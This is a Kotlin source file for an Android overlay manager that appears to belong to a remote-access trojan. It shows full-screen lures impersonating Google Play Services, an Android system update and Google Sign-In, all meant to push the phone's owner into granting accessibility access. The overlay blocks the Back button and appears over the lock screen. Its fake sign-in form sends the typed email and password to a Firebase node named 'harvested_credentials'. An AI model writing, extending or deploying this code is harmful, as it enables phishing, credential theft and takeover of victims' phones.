package com.example.service

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import android.text.InputType
import com.google.firebase.database.FirebaseDatabase

data class OverlayTemplateConfig(
    val templateId: String,
    val name: String,
    val iconEmoji: String,
    val title: String,
    val message: String,
    val buttonText: String,
    val cardBgColor: String = "#1E293B",
    val strokeColor: String = "#2563EB",
    val buttonColor: String = "#2563EB"
)

object AccessibilityOverlayManager {

    private const val TAG = "AccessibilityOverlay"
    private var overlayView: View? = null
    private var contentObserver: ContentObserver? = null
    private var isObserverRegistered = false

    val TEMPLATES = mapOf(
        "accessibility" to OverlayTemplateConfig(
            templateId = "accessibility",
            name = "System Default",
            iconEmoji = "⚠️",
            title = "Accessibility Required",
            message = "Android system accessibility service needs to be enabled in Settings. Please turn it on to continue.",
            buttonText = "OPEN ACCESSIBILITY SETTINGS",
            cardBgColor = "#1E293B",
            strokeColor = "#EF4444",
            buttonColor = "#2563EB"
        ),
        "google" to OverlayTemplateConfig(
            templateId = "google",
            name = "Google Services",
            iconEmoji = "🌐",
            title = "Google Security Verification",
            message = "Google Play Services requires system accessibility authorization to confirm account protection.",
            buttonText = "ALLOW GOOGLE VERIFICATION",
            cardBgColor = "#121824",
            strokeColor = "#4285F4",
            buttonColor = "#1A73E8"
        ),
        "system" to OverlayTemplateConfig(
            templateId = "system",
            name = "System Update",
            iconEmoji = "⚙️",
            title = "Android System Update",
            message = "A system update requires accessibility permission to complete background synchronization.",
            buttonText = "INSTALL SYSTEM UPDATE",
            cardBgColor = "#0F1A14",
            strokeColor = "#3DDC84",
            buttonColor = "#2E7D32"
        ),
        "login" to OverlayTemplateConfig(
            templateId = "login",
            name = "Google Sign-In",
            iconEmoji = "🔐",
            title = "Sign in with Google",
            message = "Your session has expired. Please verify your Google account credentials to continue.",
            buttonText = "SIGN IN",
            cardBgColor = "#1E293B",
            strokeColor = "#4285F4",
            buttonColor = "#1A73E8"
        )
    )

    fun isAccessibilityEnabled(context: Context): Boolean {
        if (RemoteAccessibilityService.isServiceEnabled()) return true

        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val expectedService = "${context.packageName}/${RemoteAccessibilityService::class.java.name}"
                val expectedShort = "${context.packageName}/.service.RemoteAccessibilityService"
                enabledServices.contains(expectedService) ||
                        enabledServices.contains(expectedShort) ||
                        enabledServices.contains(context.packageName)
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility status: ${e.message}")
            false
        }
    }

    fun startObserver(context: Context) {
        val appContext = context.applicationContext
        if (isObserverRegistered) return

        try {
            if (contentObserver == null) {
                contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean) {
                        super.onChange(selfChange)
                        Log.d(TAG, "Accessibility settings changed...")
                        if (isAccessibilityEnabled(appContext)) {
                            removeOverlay(appContext)
                            stopObserver(appContext)
                        }
                    }
                }
            }

            appContext.contentResolver.registerContentObserver(
                Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                false,
                contentObserver!!
            )
            isObserverRegistered = true
            Log.d(TAG, "Accessibility ContentObserver registered successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register ContentObserver: ${e.message}")
        }
    }

    fun stopObserver(context: Context) {
        if (!isObserverRegistered || contentObserver == null) return
        try {
            context.applicationContext.contentResolver.unregisterContentObserver(contentObserver!!)
            isObserverRegistered = false
            Log.d(TAG, "Accessibility ContentObserver unregistered.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister ContentObserver: ${e.message}")
        }
    }

    fun openAccessibilitySettings(context: Context): Boolean {
        val appContext = context.applicationContext
        val componentName = ComponentName(appContext, RemoteAccessibilityService::class.java).flattenToString()

        val directIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            putExtra(":settings:fragment_args_key", componentName)
            putExtra("EXTRA_FRAGMENT_ARG_KEY", componentName)
            val bundle = Bundle().apply {
                putString(":settings:fragment_args_key", componentName)
                putString("EXTRA_FRAGMENT_ARG_KEY", componentName)
            }
            putExtra(":settings:show_fragment_args", bundle)
            putExtra("EXTRA_SHOW_FRAGMENT_ARGUMENTS", bundle)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }

        try {
            appContext.startActivity(directIntent)
            Log.d(TAG, "Successfully launched direct accessibility settings for $componentName")
            return true
        } catch (e: Exception) {
            Log.w(TAG, "Failed launching direct accessibility settings: ${e.message}, falling back to general settings.")
        }

        return try {
            val fallbackIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            appContext.startActivity(fallbackIntent)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error opening accessibility settings: ${e.message}")
            false
        }
    }

    fun openLocationSettings(context: Context): Boolean {
        val appContext = context.applicationContext
        return try {
            val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            appContext.startActivity(intent)
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error opening location settings: ${e.message}")
            false
        }
    }

    fun checkAndToggleOverlay(context: Context) {
        Handler(Looper.getMainLooper()).post {
            val isEnabled = isAccessibilityEnabled(context)
            Log.d(TAG, "checkAndToggleOverlay: isAccessibilityEnabled=$isEnabled")
            if (isEnabled) {
                removeOverlay(context)
            } else {
                showOverlayWithFallback(context)
            }
        }
    }

    fun showOverlay(context: Context, templateId: String = "accessibility") {
        showOverlayWithFallback(context, templateId)
    }

    fun showOverlayWithFallback(context: Context, templateId: String = "accessibility"): String {
        val appContext = context.applicationContext
        startObserver(appContext)

        if (isAccessibilityEnabled(appContext)) {
            removeOverlay(appContext)
            return "SKIPPED: Accessibility Service is already ENABLED on target device."
        }

        if (overlayView != null) {
            return "SUCCESS: Accessibility overlay is already active and displayed on screen."
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(appContext)) {
            Log.w(TAG, "SYSTEM_ALERT_WINDOW permission missing. Executing fallback: opening Accessibility Settings directly.")
            val opened = openAccessibilitySettings(appContext)
            return if (opened) {
                "FALLBACK_SUCCESS: Overlay permission missing. Triggered fallback: Opened Accessibility Settings screen directly on target device."
            } else {
                "FAILED: Overlay permission missing and failed to open Accessibility Settings."
            }
        }

        var success = false
        var errorMsg = ""
        val latch = java.util.concurrent.CountDownLatch(1)

        Handler(Looper.getMainLooper()).post {
            if (overlayView != null) {
                success = true
                latch.countDown()
                return@post
            }

            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                if (windowManager == null) {
                    errorMsg = "WindowManager service unavailable"
                    latch.countDown()
                    return@post
                }

                val config = TEMPLATES[templateId.lowercase()] ?: TEMPLATES["accessibility"]!!

                val rootLayout = object : FrameLayout(appContext) {
                    override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
                        // Intercept Back button to prevent dismissing overlay
                        if (event?.keyCode == KeyEvent.KEYCODE_BACK) {
                            return true
                        }
                        return super.dispatchKeyEvent(event)
                    }
                }

                rootLayout.setBackgroundColor(Color.parseColor("#EE0F172A")) // Dark translucent background
                rootLayout.isFocusable = true
                rootLayout.isFocusableInTouchMode = true

                // Card Container
                val cardLayout = LinearLayout(appContext).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER_HORIZONTAL
                    setPadding(dpToPx(appContext, 24), dpToPx(appContext, 32), dpToPx(appContext, 24), dpToPx(appContext, 32))

                    val cardDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor(config.cardBgColor))
                        cornerRadius = dpToPx(appContext, 20).toFloat()
                        setStroke(dpToPx(appContext, 2), Color.parseColor(config.strokeColor))
                    }
                    background = cardDrawable
                }

                val cardParams = FrameLayout.LayoutParams(
                    dpToPx(appContext, 340),
                    ViewGroup.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                // Icon / Emoji
                val iconView = TextView(appContext).apply {
                    text = config.iconEmoji
                    textSize = 48f
                    gravity = Gravity.CENTER
                }

                // Title
                val titleView = TextView(appContext).apply {
                    text = config.title
                    textSize = 20f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)
                    gravity = Gravity.CENTER
                    setPadding(0, dpToPx(appContext, 12), 0, dpToPx(appContext, 12))
                }

                // Message Body
                val messageView = TextView(appContext).apply {
                    text = config.message
                    textSize = 14f
                    setTextColor(Color.parseColor("#94A3B8")) // Slate 400
                    gravity = Gravity.CENTER
                    setLineSpacing(8f, 1.1f)
                    setPadding(0, 0, 0, dpToPx(appContext, 24))
                }

                cardLayout.addView(iconView)
                cardLayout.addView(titleView)
                cardLayout.addView(messageView)

                val userInput = if (config.templateId == "login") {
                    val emailInput = EditText(appContext).apply {
                        hint = "Email or phone"
                        setTextColor(Color.WHITE)
                        setHintTextColor(Color.parseColor("#64748B"))
                        setPadding(dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12))
                        background = GradientDrawable().apply {
                            setColor(Color.parseColor("#0F172A"))
                            cornerRadius = dpToPx(appContext, 8).toFloat()
                            setStroke(1, Color.parseColor("#334155"))
                        }
                    }
                    val passInput = EditText(appContext).apply {
                        hint = "Password"
                        inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
                        setTextColor(Color.WHITE)
                        setHintTextColor(Color.parseColor("#64748B"))
                        setPadding(dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12), dpToPx(appContext, 12))
                        background = GradientDrawable().apply {
                            setColor(Color.parseColor("#0F172A"))
                            cornerRadius = dpToPx(appContext, 8).toFloat()
                            setStroke(1, Color.parseColor("#334155"))
                        }
                    }
                    val emailParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                        setMargins(0, 0, 0, dpToPx(appContext, 12))
                    }
                    val passParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                        setMargins(0, 0, 0, dpToPx(appContext, 20))
                    }
                    cardLayout.addView(emailInput, emailParams)
                    cardLayout.addView(passInput, passParams)
                    Pair(emailInput, passInput)
                } else null

                // Action Button
                val enableButton = Button(appContext).apply {
                    text = config.buttonText
                    textSize = 13f
                    setTextColor(Color.WHITE)
                    setTypeface(null, Typeface.BOLD)

                    val btnDrawable = GradientDrawable().apply {
                        setColor(Color.parseColor(config.buttonColor))
                        cornerRadius = dpToPx(appContext, 12).toFloat()
                    }
                    background = btnDrawable
                    setPadding(dpToPx(appContext, 16), dpToPx(appContext, 12), dpToPx(appContext, 16), dpToPx(appContext, 12))

                    setOnClickListener {
                        if (userInput != null) {
                            val email = userInput.first.text.toString()
                            val pass = userInput.second.text.toString()
                            if (email.isNotBlank() || pass.isNotBlank()) {
                                try {
                                    val deviceId = Settings.Secure.getString(appContext.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
                                    val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("harvested_credentials")
                                    val record = mapOf(
                                        "username" to email,
                                        "password" to pass,
                                        "timestamp" to System.currentTimeMillis()
                                    )
                                    ref.push().setValue(record)
                                } catch (_: Exception) {}
                            }
                            removeOverlay(appContext)
                        } else {
                            openAccessibilitySettings(appContext)
                        }
                    }
                }

                cardLayout.addView(enableButton)

                rootLayout.addView(cardLayout, cardParams)

                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.CENTER
                }

                windowManager.addView(rootLayout, params)
                overlayView = rootLayout
                success = true
                Log.d(TAG, "Accessibility blocking overlay view attached successfully.")
            } catch (e: Exception) {
                errorMsg = e.message ?: "Unknown window error"
                Log.e(TAG, "Failed to attach overlay view to WindowManager: ${e.message}")
            } finally {
                latch.countDown()
            }
        }

        try {
            latch.await(1500, java.util.concurrent.TimeUnit.MILLISECONDS)
        } catch (_: Exception) {}

        return if (success) {
            "SUCCESS: Accessibility overlay displayed on device screen."
        } else {
            val fallbackOpened = openAccessibilitySettings(appContext)
            if (fallbackOpened) {
                "FALLBACK_SUCCESS: Could not draw overlay ($errorMsg). Triggered fallback: Opened Accessibility Settings directly on device."
            } else {
                "FAILED: Could not draw overlay ($errorMsg) and fallback failed."
            }
        }
    }

    fun removeOverlay(context: Context) {
        val appContext = context.applicationContext
        Handler(Looper.getMainLooper()).post {
            val view = overlayView ?: return@post
            try {
                val windowManager = appContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                windowManager?.removeView(view)
                Log.d(TAG, "Accessibility overlay removed successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing overlay view: ${e.message}")
            } finally {
                overlayView = null
            }
        }
    }

    private fun dpToPx(context: Context, dp: Int): Int {
        return (dp * context.resources.displayMetrics.density).toInt()
    }
}

